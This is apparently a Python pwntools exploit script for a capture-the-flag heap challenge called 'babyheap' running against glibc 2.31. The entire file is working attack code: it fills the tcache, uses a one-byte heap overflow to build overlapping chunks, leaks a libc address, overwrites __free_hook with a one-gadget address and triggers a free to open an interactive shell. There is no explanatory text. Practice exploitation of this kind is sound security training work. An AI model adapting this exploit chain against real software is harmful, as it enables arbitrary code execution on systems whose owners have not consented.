import pwn as p

target = p.process('./babyheap')
# p.gdb.attach(target)
libc = p.ELF('./libc-2.31.so')


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b))


def malloc(size: int, payload: bytes):
    prints(target.recvuntil(b'> '))
    target.sendline(b'M')
    prints(target.recvuntil(b'> '))
    target.sendline(b(str(size)))
    prints(target.recvuntil(b'> '))
    target.sendline(payload)


def free(index: int):
    prints(target.recvuntil(b'> '))
    target.sendline(b'F')
    prints(target.recvuntil(b'> '))
    target.sendline(b(str(index)))


def show(index: int):
    prints(target.recvuntil(b'> '))
    target.sendline(b'S')
    prints(target.recvuntil(b'> '))
    target.sendline(b(str(index)))
    line = target.recvuntil(b'-----Yet Another Babyheap!-----')
    line = line.replace(b'-----Yet Another Babyheap!-----', b'').strip()
    return line


# filling up tcache
for i in range(10):
    malloc(0xf8, b'a'*0xf8)
for i in range(9, 1, -1):
    free(i)

malloc(0x100, b'b'*0x100)  # just to put the chunk from unsorted bin to small bin
malloc(0xf8, b'b'*0xf8)  # use up one entry from tcache so next free will be put into tcache

free(0)
malloc(0xf8, b'b'*0xf8+b'\x80')
free(1)
malloc(0x108, b'd'*0x100)  # id 1

line = show(1).strip(b'd')
line += b'\x00' * (8-len(line))
leak = p.u64(line)
print('leak:', hex(leak))
libc_base = leak - 0x1ebcd0
print('libc_base:', hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
print('malloc_hook:', hex(free_hook))


# now we are overwriting a chunk in the same manner again
malloc(0xf8, b'2'*0xf8)  # id 4
malloc(0xf8, b'3'*0xf8)  # id 5
malloc(0xf8, b'4'*0xf8)  # id 6

free(6)
free(4)
malloc(0xf8, b'f'*0xf8+b'\x81')  # id 4
free(5)
malloc(0x170, b'g'*0x100+p.p64(free_hook).strip(b'\x00'))  # id 5

malloc(0x10, b'0'*0x10)

gadget = libc_base + 0xe6c81
payload = p.p64(gadget).strip(b'\x00')
malloc(len(payload), payload)

target.sendline(b'F')
target.sendline(b(str(4)))

target.interactive()
